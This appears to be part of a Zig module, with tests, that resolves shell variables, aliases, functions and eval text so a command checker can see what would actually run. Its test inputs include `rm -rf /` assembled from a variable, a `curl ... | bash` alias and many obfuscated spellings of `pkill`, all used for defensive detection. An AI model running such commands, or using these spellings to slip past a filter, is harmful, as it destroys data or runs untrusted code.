                const close = matchParen(t, i + 3, hi);
                var end = if (close < hi) close + 1 else hi;
                if (end < hi and t[end] == ')') end += 1;
                try ctx.pieces.append(ctx.arena, .{ .off = i, .len = end - i, .kind = .arith });
                i = end;
                continue;
            }
            const close = matchParen(t, i + 2, hi);
            const end = if (close < hi) close + 1 else hi;
            try ctx.pieces.append(ctx.arena, .{ .off = i, .len = end - i, .kind = .command_sub });
            i = end;
            continue;
        }
        if (n == '{') {
            const close = matchBrace(t, i + 2, hi);
            const end = if (close < hi) close + 1 else hi;
            try ctx.pieces.append(ctx.arena, .{
                .off = i,
                .len = end - i,
                .kind = .braced,
                .name = t[i + 2 .. @min(close, hi)],
            });
            i = end;
            continue;
        }
        if (isNameChar(n)) {
            // A name may not run past the quote boundary its removal erased.
            const lim = @min(segEnd(w, i), hi);
            var j = i + 1;
            while (j < lim and isNameChar(t[j])) j += 1;
            try ctx.pieces.append(ctx.arena, .{
                .off = i,
                .len = j - i,
                .kind = .name,
                .name = t[i + 1 .. j],
            });
            i = j;
            continue;
        }
        if (n == '@' or n == '*' or n == '?' or n == '#' or n == '!' or n == '$') {
            try ctx.pieces.append(ctx.arena, .{ .off = i, .len = 2, .kind = .special });
            i += 2;
            continue;
        }
        // A bare `$`: the lexer did not count it either.
        i += 1;
    }
}

fn matchParen(t: []const u8, from: usize, hi: usize) usize {
    var depth: usize = 1;
    var i = from;
    while (i < hi) : (i += 1) {
        switch (t[i]) {
            '\\' => i += 1,
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if (depth == 0) return i;
            },
            else => {},
        }
    }
    return hi;
}

fn matchBrace(t: []const u8, from: usize, hi: usize) usize {
    var depth: usize = 1;
    var i = from;
    while (i < hi) : (i += 1) {
        switch (t[i]) {
            '\\' => i += 1,
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if (depth == 0) return i;
            },
            else => {},
        }
    }
    return hi;
}

fn isNameChar(c: u8) bool {
    return (c >= 'a' and c <= 'z') or (c >= 'A' and c <= 'Z') or (c >= '0' and c <= '9') or c == '_';
}

/// A plain variable name. `${VAR:-x}`, `${#VAR}` and `${VAR/a/b}` all fail
/// here, which is the point: this module reads names, not the parameter
/// expansion language.
fn isValidName(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (!isNameChar(c)) return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

const testing = std.testing;

/// Parse + resolve, keeping both alive. Every test needs the pair, because
/// `Resolved` borrows the parse's bytes.
const Pair = struct {
    parsed: shell.Parsed,
    resolved: Resolved,

    fn init(src: []const u8) !*Pair {
        const self = try testing.allocator.create(Pair);
        self.parsed = try shell.parse(testing.allocator, src);
        self.resolved = try resolve(testing.allocator, &self.parsed);
        return self;
    }

    fn deinit(self: *Pair) void {
        self.resolved.deinit();
        self.parsed.deinit();
        testing.allocator.destroy(self);
    }

    fn last(self: *const Pair) *const ResolvedCommand {
        return &self.resolved.commands[self.resolved.commands.len - 1];
    }
};

fn expectBase(p: *const Pair, want_base: []const u8, want_origin: Origin) !void {
    return expectAt(p, p.resolved.commands.len - 1, want_base, want_origin);
}

fn expectAt(p: *const Pair, index: usize, want_base: []const u8, want_origin: Origin) !void {
    const c = &p.resolved.commands[index];
    testing.expectEqualStrings(want_base, c.base) catch |err| {
        std.debug.print("in: {s}\n", .{p.resolved.source});
        return err;
    };
    testing.expectEqual(want_origin, c.origin) catch |err| {
        std.debug.print("in: {s}\n", .{p.resolved.source});
        return err;
    };
}

test "the resolution table: what each spelling of a command word resolves to" {
    const cases = [_]struct {
        in: []const u8,
        base: []const u8,
        origin: Origin,
    }{
        // Written out: nothing to resolve, and nothing invented.
        .{ .in = "pkill -f x", .base = "pkill", .origin = .literal },

        // One variable.
        .{ .in = "C=pkill; $C -f x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "C=pkill; ${C} -f x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "C=pkill; \"$C\" -f x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "C=/usr/bin/pkill; $C -f x", .base = "pkill", .origin = .resolved_var },

        // Concatenation, in every spelling the README calls out.
        .{ .in = "P=pki; K=ll; $P$K -f x", .base = "pkill", .origin = .resolved_concat },
        .{ .in = "P=pki; K=ll; \"$P$K\" -f x", .base = "pkill", .origin = .resolved_concat },
        .{ .in = "P=pk; ${P}ill -f x", .base = "pkill", .origin = .resolved_concat },
        .{ .in = "P=p; \"$P\"kill -f x", .base = "pkill", .origin = .resolved_concat },
        .{ .in = "P=pki; $P\"ll\" -f x", .base = "pkill", .origin = .resolved_concat },
        .{ .in = "P=pki; $P'll' -f x", .base = "pkill", .origin = .resolved_concat },

        // Declarator forms.
        .{ .in = "export C=pkill; $C x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "declare C=pkill; $C x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "declare -g C=pkill; $C x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "local C=pkill; $C x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "typeset C=pkill; $C x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "readonly C=pkill; $C x", .base = "pkill", .origin = .resolved_var },

        // Transitive, and shadowed.
        .{ .in = "A=pkill; B=$A; $B x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "A=ls; A=pkill; $A x", .base = "pkill", .origin = .resolved_var },
        .{ .in = "A=pk; B=ill; C=$A$B; $C x", .base = "pkill", .origin = .resolved_var },

        // Not knowable, and not guessed.
        .{ .in = "$C -f x", .base = "$C", .origin = .unresolved_dynamic },
        .{ .in = "P=pki; $P$K -f x", .base = "$P$K", .origin = .unresolved_dynamic },
        .{ .in = "C=pkill; ${C:-ls} x", .base = "${C:-ls}", .origin = .unresolved_dynamic },
        .{ .in = "C=pkill; ${#C} x", .base = "${#C}", .origin = .unresolved_dynamic },
        .{ .in = "C=pkill; $((C)) x", .base = "$((C))", .origin = .unresolved_dynamic },
        .{ .in = "unset C; $C x", .base = "$C", .origin = .unresolved_dynamic },
        .{ .in = "C=pkill; unset C; $C x", .base = "$C", .origin = .unresolved_dynamic },

        // Quoting made the expansion boundaries ambiguous: refuse, do not
        // resolve `$P` out of a single-quoted literal.
        .{ .in = "P=pki; K=ll; '$P'$K x", .base = "$P$K", .origin = .unresolved_dynamic },

        // A quoted-out dollar is a literal, and stays one.
        .{ .in = "P=pki; '$P' x", .base = "$P", .origin = .literal },
        .{ .in = "P=pki; \\$P x", .base = "$P", .origin = .literal },
        .{ .in = "P=pki; A='$P'; $A x", .base = "$P", .origin = .resolved_var },
    };

    for (cases) |c| {
        const p = try Pair.init(c.in);
        defer p.deinit();
        try expectBase(p, c.base, c.origin);
    }
}

test "an assignment prefix binds to its own invocation and nowhere else" {
    {
        // The whole point: it must NOT leak to a later stage.
        const p = try Pair.init("P=pkill true; $P -f x");
        defer p.deinit();
        try expectBase(p, "$P", .unresolved_dynamic);
        try testing.expect(p.resolved.signals.unresolved_command_word);
    }
    {
        // Nor to the invocation's own words: the shell expands those first and
        // performs the assignment after.
        const p = try Pair.init("P=pkill echo $P");
        defer p.deinit();
        const echo = p.resolved.get(0);
        try testing.expectEqualStrings("echo", echo.base);
        try testing.expect(!echo.args()[0].isResolved());
        try testing.expectEqual(@as(usize, 1), echo.locals.len);
        try testing.expectEqualStrings("P", echo.locals[0].name);
        try testing.expectEqualStrings("pkill", echo.locals[0].value.text);
    }
    {
        // It DOES reach program text an inner shell expands.
        const p = try Pair.init("P=pkill bash -c '$P -f x'");
        defer p.deinit();
        try expectBase(p, "pkill", .resolved_var);
    }
    {
        // ...but not an argv wrapper's child, whose words the OUTER shell
        // already expanded.
        const p = try Pair.init("P=pkill sudo $P -f x");
        defer p.deinit();
        try expectBase(p, "$P", .unresolved_dynamic);
    }
    {
        // `env FOO=bar cmd` carries its assignments as ordinary words.
        const p = try Pair.init("env P=pkill bash -c '$P -f x'");
        defer p.deinit();
        try expectBase(p, "pkill", .resolved_var);
    }
    {
        // A global assignment made earlier is visible everywhere later.
        const p = try Pair.init("P=pkill; sudo $P -f x");
        defer p.deinit();
        try expectBase(p, "pkill", .resolved_var);
    }
}

test "a value is resolved where it is bound, so a cycle cannot loop" {
    {
        const p = try Pair.init("A=$B; B=$A; $A x");
        defer p.deinit();
        try expectBase(p, "$A", .unresolved_dynamic);
    }
    {
        const p = try Pair.init("A=1; A=$A$A; A=$A$A; $A x");
        defer p.deinit();
        try expectBase(p, "1111", .resolved_var);
    }
    {
        // Self-reference with nothing behind it stays unknown.
        const p = try Pair.init("A=$A; $A x");
        defer p.deinit();
        try expectBase(p, "$A", .unresolved_dynamic);
    }
}

test "caps: the assignment chain and the value size are both bounded" {
    {
        var src: std.ArrayList(u8) = .empty;
        defer src.deinit(testing.allocator);
        try src.appendSlice(testing.allocator, "A0=pkill; ");
        for (1..MAX_CHAIN_DEPTH + 2) |i| {
            try src.print(testing.allocator, "A{d}=$A{d}; ", .{ i, i - 1 });
        }
        try src.print(testing.allocator, "$A{d} x", .{MAX_CHAIN_DEPTH + 1});

        const p = try Pair.init(src.items);
        defer p.deinit();
        try testing.expect(p.resolved.signals.chain_capped);
        try testing.expect(!p.last().origin.isResolved());
    }
    {
        // Doubling is the one shape that can blow up; it is cut, not followed.
        var src: std.ArrayList(u8) = .empty;
        defer src.deinit(testing.allocator);
        try src.appendSlice(testing.allocator, "A0=");
        try src.appendNTimes(testing.allocator, 'x', 512);
        try src.appendSlice(testing.allocator, "; ");
        for (1..MAX_CHAIN_DEPTH) |i| {
            try src.print(testing.allocator, "A{d}=$A{d}$A{d}; ", .{ i, i - 1, i - 1 });
        }
        try src.print(testing.allocator, "$A{d} x", .{MAX_CHAIN_DEPTH - 1});

        const p = try Pair.init(src.items);
        defer p.deinit();
        try testing.expect(p.resolved.signals.value_capped);
        try testing.expect(!p.last().origin.isResolved());
    }
    {
        var src: std.ArrayList(u8) = .empty;
        defer src.deinit(testing.allocator);
        for (0..MAX_BINDINGS + 10) |i| try src.print(testing.allocator, "V{d}=x; ", .{i});
        try src.appendSlice(testing.allocator, "ls");

        const p = try Pair.init(src.items);
        defer p.deinit();
        try testing.expect(p.resolved.signals.binding_cap);
        try testing.expect(p.resolved.stats.bindings <= MAX_BINDINGS);
    }
}

test "arguments resolve too, so a dangerous flag is catchable" {
    {
        const p = try Pair.init("X=-rf; rm $X /");
        defer p.deinit();
        const rm = p.last();
        try testing.expectEqualStrings("rm", rm.base);
        try testing.expectEqualStrings("-rf", rm.args()[0].text);
        try testing.expectEqual(Origin.resolved_var, rm.args()[0].origin);
        try testing.expectEqualStrings("/", rm.args()[1].text);
        try testing.expect(p.resolved.signals.resolved_argument);
    }
    {
        const p = try Pair.init("F=myserver; pkill -f $F");
        defer p.deinit();
        const k = p.last();
        try testing.expectEqualStrings("myserver", k.args()[1].text);
        // The command word was written out; only the argument moved.
        try testing.expectEqual(Origin.literal, k.origin);
        try testing.expect(!p.resolved.signals.indirectCommandWord());
    }
    {
        // An unknown argument is left alone, and says so.
        const p = try Pair.init("rm $X /");
        defer p.deinit();
        const rm = p.last();
        try testing.expectEqualStrings("$X", rm.args()[0].text);
        try testing.expectEqual(Origin.unresolved_dynamic, rm.args()[0].origin);
    }
}

test "a resolved word keeps the span of the bytes that were written" {
    const src = "P=pki; K=ll; $P$K -f myserver";
    const p = try Pair.init(src);
    defer p.deinit();

    const cmd = p.last();
    try testing.expectEqualStrings("pkill", cmd.base);
    // The value is `pkill`; the span still underlines `$P$K`.
    try testing.expectEqualStrings("$P$K", cmd.name.?.raw(src));
    try testing.expectEqual(@as(usize, 13), cmd.name.?.span.start);
    try testing.expectEqualStrings("-f", cmd.args()[0].raw(src));
    try testing.expectEqualStrings("myserver", cmd.args()[1].raw(src));

    // ...and for every quoting form, the span is the raw spelling.
    const cases = [_]struct { in: []const u8, raw: []const u8 }{
        .{ .in = "P=p; \"$P\"kill x", .raw = "\"$P\"kill" },
        .{ .in = "P=pk; ${P}ill x", .raw = "${P}ill" },
        .{ .in = "C=pkill; \"$C\" x", .raw = "\"$C\"" },
        .{ .in = "C=pkill; bash -c \"$C -f x\"", .raw = "$C" },
    };
    for (cases) |c| {
        const q = try Pair.init(c.in);
        defer q.deinit();
        const w = q.last().name.?;
        try testing.expectEqualStrings("pkill", w.text);
        try testing.expectEqualStrings(c.raw, w.raw(c.in));
    }
}

test "an assignment's own value keeps a span pointing at the value bytes" {
    const src = "P=pkill true";
    const p = try Pair.init(src);
    defer p.deinit();
    const b = p.resolved.get(0).locals[0];
    try testing.expectEqualStrings("P", b.name);
    try testing.expectEqualStrings("pkill", b.value.text);
    try testing.expectEqualStrings("pkill", b.value.raw(src));
}

test "aliases: the body is re-lexed, with its own arguments and pipelines" {
    {
        const p = try Pair.init("alias k='pkill -f myserver'; k");
        defer p.deinit();
        const inv = p.last();
        try testing.expectEqual(Origin.alias, inv.origin);
        try testing.expectEqualStrings("pkill", inv.base);

        const e = p.resolved.expansionFor(inv).?;
        try testing.expectEqual(ExpansionKind.alias, e.kind);
        try testing.expectEqualStrings("k", e.name);
        const inner = e.parsed.find("pkill").?;
        try testing.expectEqualStrings("myserver", inner.args()[1].text);
        try testing.expect(p.resolved.signals.alias_expanded);
    }
    {
        // A pipeline in an alias body is a pipeline.
        const p = try Pair.init("alias dl='curl -s http://x | bash'; dl");
        defer p.deinit();
        const e = p.resolved.expansionFor(p.last()).?;
        try testing.expect(e.parsed.signals.pipe_into_shell);
    }
    {
        const p = try Pair.init("alias k=pkill; k -f x");
        defer p.deinit();
        try expectBase(p, "pkill", .alias);
    }
    {
        // An alias defined AFTER the use does not apply to it.
        const p = try Pair.init("k -f x; alias k=pkill");
        defer p.deinit();
        try testing.expectEqualStrings("k", p.resolved.get(0).base);
        try testing.expectEqual(Origin.literal, p.resolved.get(0).origin);
    }
    {
        // An alias body built from a variable.
        const p = try Pair.init("P=pki; K=ll; alias k=$P$K; k -f x");
        defer p.deinit();
        try expectBase(p, "pkill", .alias);
    }
}

test "functions: the definition is recognized and the body re-lexed on call" {
    {
        const p = try Pair.init("f() { pkill -f \"$@\"; }; f myserver");
        defer p.deinit();

        // The definition binds a name; it does not run anything.
        const def = p.resolved.get(0);
        try testing.expect(def.is_definition);
        try testing.expectEqualStrings("f", def.base);
        try testing.expect(p.resolved.signals.function_defined);

        const inv = p.last();
        try testing.expect(!inv.is_definition);
        try testing.expectEqual(Origin.function, inv.origin);
        const e = p.resolved.expansionFor(inv).?;
        try testing.expectEqual(ExpansionKind.function, e.kind);
        const inner = e.parsed.find("pkill").?;
        try testing.expectEqualStrings("-f", inner.args()[0].text);
        try testing.expectEqualStrings("$@", inner.args()[1].text);
        try testing.expect(p.resolved.signals.function_expanded);

        // The body span points back at the original bytes.
        try testing.expectEqualStrings(e.body, e.body_span.?.slice(p.resolved.source));
    }
    {
        const p = try Pair.init("function f { pkill -f x; }\nf");
        defer p.deinit();
        try testing.expect(p.resolved.get(0).is_definition);
        const e = p.resolved.expansionFor(p.last()).?;
        try testing.expect(e.parsed.find("pkill") != null);
    }
    {
        // Multi-line body: the brace opens the stage, the body follows.
        const p = try Pair.init("f() {\n  pkill -f x\n}\nf");
        defer p.deinit();
        try testing.expect(p.resolved.get(0).is_definition);
        try testing.expect(p.resolved.signals.function_expanded);
    }
    {
        // `find` skips definitions: a defined-but-never-called function is not
        // a command that runs.
        const p = try Pair.init("f() { ls; }");
        defer p.deinit();
        try testing.expect(p.resolved.find("f") == null);
        try testing.expect(p.resolved.signals.function_expanded == false);
    }
    {
        // Not a definition: a plain call with a brace-group argument nearby.
        const p = try Pair.init("ls; { echo hi; }");
        defer p.deinit();
        for (p.resolved.commands) |c| try testing.expect(!c.is_definition);
    }
}

test "a command word that resolves to program text is re-lexed, not treated as a name" {
    {
        const p = try Pair.init("C=\"pkill -f myserver\"; eval $C");
        defer p.deinit();
        // shell.zig re-lexed `$C` as eval's program text; we resolved it.
        var found: ?*const ResolvedCommand = null;
        for (p.resolved.commands) |*rc| {
            if (rc.expansion != null) found = rc;
        }
        const rc = found orelse return error.NoExpansion;
        const e = p.resolved.expansionFor(rc).?;
        try testing.expectEqual(ExpansionKind.command_text, e.kind);
        try testing.expectEqualStrings("pkill -f myserver", e.body);
        try testing.expectEqualStrings("pkill", e.parsed.find("pkill").?.base);
        try testing.expect(p.resolved.signals.value_is_program_text);
        // `base` names what will actually run.
        try testing.expectEqualStrings("pkill", rc.base);
    }
    {
        // A literal command word with a space is a path, not program text.
        const p = try Pair.init("\"/opt/my prog\" -f x");
        defer p.deinit();
        try testing.expect(p.last().expansion == null);
        try testing.expectEqualStrings("my prog", p.last().base);
    }
}

test "a command substitution is flagged, and its own text is still visible" {
    // The substitution's own commands land AFTER the stage that carries them,
    // so the outer command is index 0.
    {
        const p = try Pair.init("$(which pkill) -f x");
        defer p.deinit();
        try expectAt(p, 0, "$(which pkill)", .substitution_derived);
        try testing.expect(p.resolved.signals.unresolved_command_word);
        // shell.zig lexed the substitution; nothing here hid it.
        const which = p.parsed.find("which").?;
        try testing.expectEqualStrings("pkill", which.args()[0].text);
    }
    {
        const p = try Pair.init("`which pkill` -f x");
        defer p.deinit();
        try expectAt(p, 0, "`which pkill`", .substitution_derived);
    }
    {
        // A concatenation with one substitution in it is still unreadable,
        // and reports the substitution as the reason.
        const p = try Pair.init("P=pki; $P$(echo ll) -f x");
        defer p.deinit();
        try expectAt(p, 1, "$P$(echo ll)", .substitution_derived);
    }
    {
        const p = try Pair.init("diff <(sort a) <(sort b)");
        defer p.deinit();
        const d = p.resolved.get(0);
        try testing.expectEqualStrings("diff", d.base);
        try testing.expectEqual(Origin.substitution_derived, d.args()[0].origin);
    }
}

test "signals: resolved and unresolved indirection are separate conditions" {
    {
        const p = try Pair.init("P=pki; K=ll; $P$K -f x");
        defer p.deinit();
        try testing.expect(p.resolved.signals.resolved_command_word);
        try testing.expect(!p.resolved.signals.unresolved_command_word);
        // The parse still reports the shape it saw, unchanged.
        try testing.expect(p.parsed.signals.concatenated_command_word);
    }
    {
        const p = try Pair.init("$UNKNOWN -f x");
        defer p.deinit();
        try testing.expect(p.resolved.signals.unresolved_command_word);
        try testing.expect(!p.resolved.signals.resolved_command_word);
        try testing.expect(p.resolved.signals.indirectCommandWord());
    }
    {
        const p = try Pair.init("ls -la");
        defer p.deinit();
        try testing.expect(!p.resolved.signals.any());
    }
}

test "nested and wrapped commands resolve with the same rules" {
    const cases = [_][]const u8{
        "C=pkill; sudo $C -f x",
        "C=pkill; bash -lc \"$C -f x\"",
        "C=pkill; timeout 5 $C -f x",
        "C=pkill; xargs $C",
        "C=pkill; ssh host \"$C -f x\"",
        "C=pkill; nohup $C -f x",
        "C=pkill; uv run $C -f x",
        "C=pkill; eval \"$C -f x\"",
        "C=pkill; if $C -f x; then true; fi",
        "C=pkill; ( $C -f x )",
        "C=pkill; ls | $C -f x",
    };
    for (cases) |src| {
        const p = try Pair.init(src);
        defer p.deinit();
        var hit = false;
        for (p.resolved.commands) |c| {
            if (std.mem.eql(u8, c.base, "pkill")) hit = true;
        }
        if (!hit) {
            std.debug.print("no resolved pkill in: {s}\n", .{src});
            return error.NotResolved;
        }
        try testing.expect(p.resolved.find("pkill") != null);
    }
}

test "every command lines up with its parse, and nothing is invented" {
    const src = "A=1 B=2 make && cd /x | tee log; ls & $A";
    const p = try Pair.init(src);
    defer p.deinit();

    try testing.expectEqual(p.parsed.commands.len, p.resolved.commands.len);
    for (p.parsed.commands, p.resolved.commands, 0..) |sc, rc, i| {
        try testing.expectEqual(@as(u32, @intCast(i)), rc.index);
        try testing.expectEqual(sc.words.len, rc.words.len);
        for (sc.words, rc.words) |sw, rw| {
            // A word nothing touched keeps its own bytes and its own span.
            if (rw.origin == .literal) try testing.expectEqualStrings(sw.text, rw.text);
            try testing.expectEqual(sw.span.start, rw.span.start);
        }
    }
    // `A=1 B=2 make` is a prefix; `$A` in a later stage sees nothing.
    try testing.expect(!p.last().origin.isResolved());
}

test "resolution carries no state between runs" {
    {
        const p = try Pair.init("P=pki; K=ll; $P$K x");
        defer p.deinit();
        try expectBase(p, "pkill", .resolved_concat);
    }
    {
        // The very next resolution must know nothing about P or K.
        const p = try Pair.init("$P$K x");
        defer p.deinit();
        try expectBase(p, "$P$K", .unresolved_dynamic);
        try testing.expectEqual(@as(u32, 0), p.resolved.stats.bindings);
    }
    {
        const p = try Pair.init("alias k=pkill; k");
        defer p.deinit();
        try expectBase(p, "pkill", .alias);
    }
    {
        const p = try Pair.init("k");
        defer p.deinit();
        try expectBase(p, "k", .literal);
        try testing.expectEqual(@as(usize, 0), p.resolved.expansions.len);
    }
}

test "malformed and degenerate input resolves to a partial result, never a failure" {
    const cases = [_][]const u8{
        "",
        "   ",
        "P=",
        "=x",
        "$",
        "$$",
        "${",
        "${}",
        "$( ",
        "P=pki; $P",
        "P='unterminated; $P x",
        "alias",
        "alias =x",
        "alias k=",
        "export",
        "unset",
        "f() {",
        "f()",
        "function",
        "function f",
        "P=$; $P x",
        "$'\\x24P' x",
    };
    for (cases) |src| {
        const p = try Pair.init(src);
        defer p.deinit();
        try testing.expectEqual(p.parsed.commands.len, p.resolved.commands.len);
    }
}

test "the whole shell corpus resolves without leaking or crashing" {
    const corpus = @embedFile("testdata/shell-corpus.txt");
    var it = std.mem.splitScalar(u8, corpus, '\n');
    var lines: usize = 0;
    while (it.next()) |line| {
        const t = std.mem.trim(u8, line, " \t\r");
        if (t.len == 0 or std.mem.startsWith(u8, t, "##")) continue;
        if (std.mem.eql(u8, t, "%%DIVERGENT")) continue;
        lines += 1;

        const p = try Pair.init(t);
        defer p.deinit();
        for (p.resolved.commands, p.parsed.commands) |rc, sc| {
            // A resolved span must still name bytes inside the source.
            for (rc.words) |w| try testing.expect(w.span.end() <= p.resolved.source.len);
            try testing.expectEqual(sc.words.len, rc.words.len);
        }
    }
    try testing.expect(lines > 150);
}

// --- allocation budget ------------------------------------------------------

const CountingAllocator = struct {
    child: std.mem.Allocator,
    count: usize = 0,

    fn allocator(self: *CountingAllocator) std.mem.Allocator {
        return .{ .ptr = self, .vtable = &.{
            .alloc = alloc,
            .resize = resize,
            .remap = remap,
            .free = free,
        } };
    }

    fn alloc(ctx: *anyopaque, len: usize, alignment: std.mem.Alignment, ra: usize) ?[*]u8 {
        const self: *CountingAllocator = @ptrCast(@alignCast(ctx));
        self.count += 1;
        return self.child.rawAlloc(len, alignment, ra);
    }
    fn resize(ctx: *anyopaque, memory: []u8, alignment: std.mem.Alignment, new_len: usize, ra: usize) bool {
        const self: *CountingAllocator = @ptrCast(@alignCast(ctx));
        return self.child.rawResize(memory, alignment, new_len, ra);
    }
    fn remap(ctx: *anyopaque, memory: []u8, alignment: std.mem.Alignment, new_len: usize, ra: usize) ?[*]u8 {
        const self: *CountingAllocator = @ptrCast(@alignCast(ctx));
        return self.child.rawRemap(memory, alignment, new_len, ra);
    }
    fn free(ctx: *anyopaque, memory: []u8, alignment: std.mem.Alignment, ra: usize) void {
        const self: *CountingAllocator = @ptrCast(@alignCast(ctx));
        self.child.rawFree(memory, alignment, ra);
    }
};

test "allocation budget: resolution costs a handful of allocations on top of the parse" {
    const cases = [_][]const u8{
        "ls -la",
        "git status --porcelain",
        "cd /repo && git add -A && git commit -m wip",
        "sudo bash -lc \"pkill -f myserver\"",
        "P=pki; K=ll; $P$K -f myserver",
        "X=-rf; rm $X /tmp/scratch",
        "export C=pkill; C2=$C; sudo $C2 -f x",
    };
    for (cases) |src| {
        var parsed = try shell.parse(testing.allocator, src);
        defer parsed.deinit();

        var counting = CountingAllocator{ .child = testing.allocator };
        var r = try resolve(counting.allocator(), &parsed);
        r.deinit();

        if (counting.count > 4) {
            std.debug.print("{s}: {d} allocations\n", .{ src, counting.count });
            return error.AllocationBudget;
        }
    }
}
